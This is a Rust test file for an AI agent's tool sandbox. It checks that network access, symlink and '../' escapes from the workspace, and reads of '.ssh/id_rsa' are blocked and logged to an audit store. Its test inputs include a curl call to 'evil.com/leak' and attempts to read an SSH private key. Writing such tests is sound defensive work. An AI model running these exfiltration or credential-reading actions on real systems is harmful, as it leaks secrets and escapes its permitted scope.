use std::fs;
use std::sync::Arc;

use nexus_albaai::checkpoints::sqlite::SqliteCheckpointStore;
use nexus_albaai::checkpoints::store::CheckpointStore;
use nexus_albaai::domain::ExecutionScope;
use nexus_albaai::sandbox::macos::{execute_macos, generate_seatbelt_profile};
#[cfg(not(target_os = "macos"))]
use nexus_albaai::sandbox::types::SandboxError;
use nexus_albaai::sandbox::types::SandboxPolicy;
use nexus_albaai::tools::dir_list::scan_directory;
use nexus_albaai::tools::file_read::ReadFileTool;
use nexus_albaai::tools::file_write::WriteFileTool;
use nexus_albaai::tools::path_guard::{resolve_existing_directory, resolve_writable_file};
use nexus_albaai::tools::run_cmd::RunCommandTool;
use nexus_albaai::tools::types::Tool;
use tempfile::tempdir;
use uuid::Uuid;

#[test]
fn test_seatbelt_profile_denies_network_by_default() {
    let ws = tempdir().unwrap();
    let default_policy = SandboxPolicy::new(ws.path());
    assert!(!default_policy.allow_network);

    let profile = generate_seatbelt_profile(ws.path(), &default_policy);
    assert!(
        profile.contains("(deny network*)"),
        "Default seatbelt profile must deny network"
    );
    assert!(
        !profile.contains("(allow network"),
        "Default seatbelt profile must not allow network"
    );

    let allowed_policy = default_policy.with_network(true);
    let allowed_profile = generate_seatbelt_profile(ws.path(), &allowed_policy);
    assert!(
        allowed_profile.contains("(allow network-outbound)"),
        "Allowed policy must permit outbound network"
    );
    assert!(
        !allowed_profile.contains("(deny network*)"),
        "Allowed policy must not deny network"
    );
}

#[tokio::test]
async fn test_write_through_symlink_pointing_outside_blocked_and_audited() {
    let ws = tempdir().unwrap();
    let outside = tempdir().unwrap();
    let outside_file = outside.path().join("secret.txt");
    fs::write(&outside_file, "secret payload").unwrap();

    let symlink_path = ws.path().join("link_to_outside.txt");
    #[cfg(unix)]
    std::os::unix::fs::symlink(&outside_file, &symlink_path).unwrap();

    let resolve_res = resolve_writable_file(ws.path(), "link_to_outside.txt");
    assert!(
        resolve_res.is_err(),
        "resolve_writable_file must reject symlinks resolving outside"
    );

    let audit_db = ws.path().join("audit.db");
    let store = Arc::new(SqliteCheckpointStore::new(&audit_db).unwrap());
    let tool = WriteFileTool::new(ws.path().to_path_buf()).with_audit_store(store.clone());
    let scope = ExecutionScope::new(Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4()).unwrap();

    let args = serde_json::json!({
        "path": "link_to_outside.txt",
        "content": "illegal overwrite attempt"
    });
    let exec_res = tool.execute(&scope, &args).await;
    assert!(
        exec_res.is_err(),
        "WriteFileTool must reject writing through symlink pointing outside"
    );

    let logs = store.list_audit_logs(&scope).await.unwrap();
    assert!(
        logs.iter().any(|l| l.action == "sandbox.write_blocked"),
        "Audit row for blocked symlink write must exist"
    );
}

#[test]
fn test_path_resolving_to_directory_outside_blocked() {
    let ws = tempdir().unwrap();
    let outside = tempdir().unwrap();

    let symlink_dir = ws.path().join("link_to_outside_dir");
    #[cfg(unix)]
    std::os::unix::fs::symlink(outside.path(), &symlink_dir).unwrap();

    let resolve_res = resolve_existing_directory(ws.path(), "link_to_outside_dir");
    assert!(
        resolve_res.is_err(),
        "resolve_existing_directory must reject directory symlinks resolving outside"
    );

    let scan_res = scan_directory(ws.path(), "link_to_outside_dir", 2, 50, false);
    assert!(
        scan_res.is_err(),
        "scan_directory must reject directory symlinks resolving outside"
    );
}

#[tokio::test]
async fn test_write_outside_workspace_blocked_and_audited() {
    let ws = tempdir().unwrap();
    let audit_db = ws.path().join("audit_outside.db");
    let store = Arc::new(SqliteCheckpointStore::new(&audit_db).unwrap());
    let tool = WriteFileTool::new(ws.path().to_path_buf()).with_audit_store(store.clone());
    let scope = ExecutionScope::new(Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4()).unwrap();

    let args = serde_json::json!({
        "path": "../outside.txt",
        "content": "write outside workspace"
    });
    let exec_res = tool.execute(&scope, &args).await;
    assert!(
        exec_res.is_err(),
        "Writing outside workspace root must be blocked"
    );

    let logs = store.list_audit_logs(&scope).await.unwrap();
    assert!(
        logs.iter().any(|l| l.action == "sandbox.write_blocked"),
        "Audit row for write outside workspace must be read back"
    );
}

#[tokio::test]
async fn test_read_ssh_blocked_and_audited() {
    let ws = tempdir().unwrap();
    let audit_db = ws.path().join("audit_read.db");
    let store = Arc::new(SqliteCheckpointStore::new(&audit_db).unwrap());
    let tool = ReadFileTool::new(ws.path().to_path_buf()).with_audit_store(store.clone());
    let scope = ExecutionScope::new(Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4()).unwrap();

    let args_ssh = serde_json::json!({
        "path": ".ssh/id_rsa"
    });
    let res_ssh = tool.execute(&scope, &args_ssh).await;
    assert!(res_ssh.is_err(), "Reading .ssh/id_rsa must be blocked");

    let args_traversal_ssh = serde_json::json!({
        "path": "../.ssh/id_rsa"
    });
    let res_traversal = tool.execute(&scope, &args_traversal_ssh).await;
    assert!(
        res_traversal.is_err(),
        "Reading traversal .ssh must be blocked"
    );

    let logs = store.list_audit_logs(&scope).await.unwrap();
    assert!(
        logs.iter().any(|l| l.action == "sandbox.read_blocked"),
        "Audit row for read of sensitive ssh path must be read back"
    );
}

#[tokio::test]
async fn test_curl_url_from_run_command_blocked_and_audited() {
    let ws = tempdir().unwrap();
    let audit_db = ws.path().join("audit_curl.db");
    let store = Arc::new(SqliteCheckpointStore::new(&audit_db).unwrap());
    let tool = RunCommandTool::new(ws.path().to_path_buf()).with_audit_store(store.clone());
    let scope = ExecutionScope::new(Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4()).unwrap();

    let args = serde_json::json!({
        "program": "curl",
        "args": ["https://evil.com/leak"],
        "allow_network": false
    });

    let res = tool.execute(&scope, &args).await;
    assert!(
        res.is_err(),
        "curl of external URL with default allow_network=false must be blocked"
    );

    let logs = store.list_audit_logs(&scope).await.unwrap();
    let network_blocked_log = logs
        .iter()
        .find(|l| l.action == "sandbox.network_blocked")
        .expect("Audit row for blocked network curl must exist in SQLite");

    assert_eq!(network_blocked_log.details["program"], "curl");
}

#[tokio::test]
async fn test_macos_seatbelt_runner_platform_check() {
    let ws = tempdir().unwrap();
    let policy = SandboxPolicy::new(ws.path());

    #[cfg(target_os = "macos")]
    {
        let res = execute_macos(
            ws.path(),
            &policy,
            "/bin/echo",
            &["seatbelt-active".to_string()],
            None,
        )
        .await;
        assert!(res.is_ok(), "Seatbelt runner must succeed on macOS");
    }

    #[cfg(not(target_os = "macos"))]
    {
        let res = execute_macos(ws.path(), &policy, "/bin/echo", &["test".to_string()], None).await;
        match res {
            Err(SandboxError::UnsupportedPlatform(msg)) => {
                assert!(msg.contains("Apple Seatbelt"));
            }
            _ => panic!("Expected UnsupportedPlatform on non-macOS, got {:?}", res),
        }
    }
}
